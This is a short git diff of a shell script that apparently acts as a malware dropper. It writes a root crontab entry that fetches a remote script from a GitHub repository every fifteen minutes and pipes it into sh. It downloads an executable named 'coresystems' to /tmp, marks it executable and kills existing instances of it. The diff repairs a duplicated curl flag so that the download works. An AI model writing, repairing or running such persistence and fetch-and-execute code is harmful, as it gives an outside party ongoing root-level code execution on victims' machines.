@@ -5,7 +5,7 @@ mkdir -p /var/spool/cron/crontabs
 echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root.sh | sh" > /var/spool/cron/crontabs/root
 
 if [ ! -f "/tmp/coresystems" ] ; then
-	curl -fsSL curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
+	curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
 fi
 chmod +x /tmp/coresystems 
 ps auxf | grep -v grep | grep coresystems | awk '{print $2}' |xargs kill -9
